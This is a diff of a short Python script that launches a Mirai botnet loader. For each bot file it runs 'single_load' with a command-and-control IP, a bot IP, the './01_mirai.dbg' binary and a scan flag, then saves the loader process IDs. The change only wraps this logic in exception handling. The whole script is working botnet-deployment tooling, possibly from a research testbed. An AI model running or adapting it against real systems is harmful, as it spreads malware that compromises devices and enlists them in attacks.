@@ -12,20 +12,25 @@ def main(argv):
     scan_flag = argv[3]
     pids_file = argv[4]
 
-    single_load = "single_load"
-    mirai_exec_file = "./01_mirai.dbg"
+    try:
+        single_load = "single_load"
+        mirai_exec_file = "./01_mirai.dbg"
 
-    for input_file in glob.glob("{0}*.txt".format(input_bot)):
-        bot_ip = ''
-        with open(input_file, 'rt') as rf:
-            line = rf.readline()
-            infor = line.strip().split(':')
-            bot_ip = infor[0]
-        cmd = './{0} {1} {2} {3} \"{4} {5} {6} {7}\" 1 1 1 &'.format(single_load, cnc_ip, input_file, mirai_exec_file, cnc_ip, bot_ip, cnc_ip, scan_flag)
+        for input_file in glob.glob("{0}*.txt".format(input_bot)):
+            bot_ip = ''
+            with open(input_file, 'rt') as rf:
+                line = rf.readline()
+                infor = line.strip().split(':')
+                bot_ip = infor[0]
+            cmd = './{0} {1} {2} {3} \"{4} {5} {6} {7}\" 1 1 1 &'.format(single_load, cnc_ip, input_file, mirai_exec_file, cnc_ip, bot_ip, cnc_ip, scan_flag)
+            os.system(cmd)
+
+        cmd = 'ps -ef | grep \'{0}\' | awk \'{{print $2}}\' > {1}'.format(single_load, pids_file)
         os.system(cmd)
-
-    cmd = 'ps -ef | grep \'{0}\' | awk \'{{print $2}}\' > {1}'.format(single_load, pids_file)
-    os.system(cmd)
+        
+    except Exception as e:
+        print(e)
+        pass
 
 
 main(sys.argv)
